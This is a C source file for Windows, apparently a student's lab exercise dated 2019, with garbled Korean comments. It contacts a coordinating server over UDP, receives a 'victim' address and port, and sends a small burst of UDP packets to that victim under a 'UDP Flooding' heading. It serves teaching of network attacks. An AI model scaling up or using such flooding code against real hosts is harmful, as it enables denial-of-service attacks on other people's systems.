/*

���� : ��������Ȱ��Ǽ��ڵ���� (02)
��¥ : 2019�� 4�� 16��
�̸� : ������

*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS				//inet_addr()�� ���� �ذ�
#define DESTINATION "255.255.255.0"					//��� �ּ�, ������ȣ�� ���� ����Ʈ�� �������� ���� ���� ��� ip ����
#define PORT 10004
#define PACKET_SIZE 64

#include <stdio.h>									//printf�� ����ϱ� ���� �������
#include <WinSock2.h>								//������ ����ϱ� ���� �������
#include <conio.h>									//���� �� �ڵ� �ݱ� ����

#pragma comment(lib, "ws2_32")						//������ ������ ������ϵ��� ������ ���� ���� ��ũ

int main() {

	//���� �ʱ�ȭ
	WSADATA wsaData;								//Windows�� ���� �ʱ�ȭ ������ �����ϱ����� ����ü
	WSAStartup(MAKEWORD(2, 2), &wsaData);			//���� ������ 2.2 

	int ssocket;
	int clen;
	struct sockaddr_in client_addr, server_addr, victim_addr;
	char buf[PACKET_SIZE];

	strcpy_s(buf, "IMHACKER_2017111299");

	//���� ����
	printf("\n 1. ���� ����\n");
	if ((ssocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
		printf(" sendto error : %d\n\n", WSAGetLastError());
		exit(1);
	}

	//���� ����
	printf("\n 2. ���� ����\n server IP :	%s\n server PORT :	%d\n", DESTINATION, PORT);
	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr(DESTINATION);
	server_addr.sin_port = htons(PORT);

	//UDP�� ������ ����
	printf("\n 3. ������ ����\n");
	if (sendto(ssocket, (const char*)buf, PACKET_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
		printf(" sendto error : %d\n\n", WSAGetLastError());
		exit(1);
	}
	printf(" send message : %s\n", buf);	//���

	//UDP�� ������ ����
	printf("\n 4. ������ ����\n");
	clen = sizeof(client_addr);
	int recv = recvfrom(ssocket, (char*)buf, PACKET_SIZE, 0, (struct sockaddr*)&client_addr, &clen);
	if ( recv< 0) {
		printf(" recvfrom error : %d\n\n", WSAGetLastError());
		exit(1);
	}
	buf[recv] = '\0';							//�������� ���ڿ� �� ������ �ΰ��߰�
	printf("%d",recv);
	printf(" receive message : %s\n", buf);		//���


	////������ ó��
	printf("\n 5. ������ ó��\n");
	char victimIP[19];							//victim�� ip�� ���� ���ڿ�
	char victimPORT[6];							//victim�� �� ���� ���ڿ�

	strcpy_s(buf, strchr(buf,'_')+1);			//"OKEY_" ����
	strcpy_s(victimIP, strtok(buf, ":"));
	strcpy_s(victimPORT, strtok(NULL, "\n"));

	printf(" victim IP :	%s\n victim PORT :	%s\n", victimIP, victimPORT);//���


	//UDP Flooding
	//���� �ּ� �缳��
	printf("\n 6. ���� �ּ� �缳��\n");
	printf(" server IP :	%s >> %s\n", DESTINATION, victimIP);
	printf(" server PORT :	%d >> %s\n", PORT, victimPORT);
	memset(&victim_addr, 0, sizeof(victim_addr));
	victim_addr.sin_family = AF_INET;
	victim_addr.sin_addr.s_addr = inet_addr(victimIP);
	victim_addr.sin_port = htons(atoi(victimPORT));

	//�޼��� ����
	buf[0] = '\0';
	strcat_s(buf, "20171111299");

	//UDP�� ������ ����
	printf("\n 7. victim�� ������ ����\n");
	for (int i = 0; i < 10; i++){
		if (sendto(ssocket, (const char*)buf, PACKET_SIZE, 0, (struct sockaddr*)&victim_addr, sizeof(victim_addr)) == SOCKET_ERROR) {
			printf(" sendto error : %d\n\n", WSAGetLastError());
			exit(1);
		}
		printf(" send message : %s .....%2d\n", buf, i+1);	//���
	}



	//���� ����
	closesocket(ssocket);

	WSACleanup();

	getch();
	return 0;
}

